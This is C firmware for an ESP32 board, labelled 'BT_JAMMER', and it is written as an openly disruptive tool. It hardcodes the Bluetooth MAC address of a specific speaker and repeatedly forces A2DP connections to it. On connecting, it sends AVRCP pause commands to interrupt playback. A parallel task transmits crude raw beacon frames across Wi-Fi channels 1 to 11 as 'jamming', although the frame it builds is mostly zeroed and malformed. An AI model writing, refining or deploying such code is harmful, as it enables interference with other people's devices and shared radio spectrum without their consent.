#include <stdio.h>
#include <string.h>
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_gap_bt_api.h"
#include "esp_a2dp_api.h"
#include "esp_avrc_api.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "BT_JAMMER";

// Target speaker Bluetooth MAC address
static esp_bd_addr_t target_device = {0xf4, 0x4e, 0xfd, 0x03, 0xa6, 0xdc};

// GAP callback
static void esp_gap_cb(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
    switch (event) {
        case ESP_BT_GAP_READ_REMOTE_NAME_EVT:
            if (param->read_rmt_name.stat == ESP_BT_STATUS_SUCCESS) {
                ESP_LOGI(TAG, "Remote device name: %s", param->read_rmt_name.rmt_name);
            } else {
                ESP_LOGI(TAG, "Failed to read remote name");
            }
            break;
        default:
            break;
    }
}

// A2DP callback
static void a2dp_cb(esp_a2d_cb_event_t event, esp_a2d_cb_param_t *param) {
    if (event == ESP_A2D_CONNECTION_STATE_EVT) {
        ESP_LOGI(TAG, "A2DP connection state: %d", param->conn_stat.state);
        if (param->conn_stat.state == ESP_A2D_CONNECTION_STATE_CONNECTED) {
            ESP_LOGI(TAG, "Sending AVRCP PAUSE to disrupt playback");
            esp_avrc_ct_send_passthrough_cmd(0, ESP_AVRC_PT_CMD_PAUSE, ESP_AVRC_PT_CMD_STATE_PRESSED);
            esp_avrc_ct_send_passthrough_cmd(0, ESP_AVRC_PT_CMD_PAUSE, ESP_AVRC_PT_CMD_STATE_RELEASED);
        }
    }
}

// AVRCP callback
static void avrc_cb(esp_avrc_ct_cb_event_t event, esp_avrc_ct_cb_param_t *param) {
    // Not used in this logic but required for registration
}

// Wi-Fi jamming task (unchanged)
static void wifi_jammer_task(void *pvParameters) {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_start());

    for (int channel = 1; channel <= 11; channel++) {
        esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Failed to set Wi-Fi channel %d: %s", channel, esp_err_to_name(err));
            continue;
        }

        ESP_LOGI(TAG, "Wi-Fi jamming on channel %d", channel);

        uint8_t beacon_frame[200];
        memset(beacon_frame, 0, sizeof(beacon_frame));
        beacon_frame[0] = 0x80;
        beacon_frame[1] = 0x00;
        memcpy(&beacon_frame[24], "JAMMER", 6);
        for (int i = 0; i < 10; i++) {
            esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, sizeof(beacon_frame), false);
            vTaskDelay(10 / portTICK_PERIOD_MS);
        }
    }
    vTaskDelete(NULL);
}

void app_main(void) {
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_BLE));
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    bt_cfg.mode = ESP_BT_MODE_CLASSIC_BT;
    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT));
    ESP_ERROR_CHECK(esp_bluedroid_init());
    ESP_ERROR_CHECK(esp_bluedroid_enable());

    ESP_ERROR_CHECK(esp_bt_gap_register_callback(esp_gap_cb));
    ESP_ERROR_CHECK(esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_NON_DISCOVERABLE));
    ESP_ERROR_CHECK(esp_bt_gap_set_device_name("BT_JAMMER"));

    ESP_ERROR_CHECK(esp_a2d_register_callback(a2dp_cb));
    ESP_ERROR_CHECK(esp_a2d_sink_register_data_callback(NULL));
    ESP_ERROR_CHECK(esp_a2d_sink_init());

    ESP_ERROR_CHECK(esp_avrc_ct_init());
    ESP_ERROR_CHECK(esp_avrc_ct_register_callback(avrc_cb));

    xTaskCreate(wifi_jammer_task, "wifi_jammer", 4096, NULL, 5, NULL);

    ESP_LOGI(TAG, "Starting Bluetooth jamming...");
    while (1) {
        esp_err_t err = esp_a2d_sink_connect(target_device);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to connect A2DP: %s", esp_err_to_name(err));
        }
        vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
}
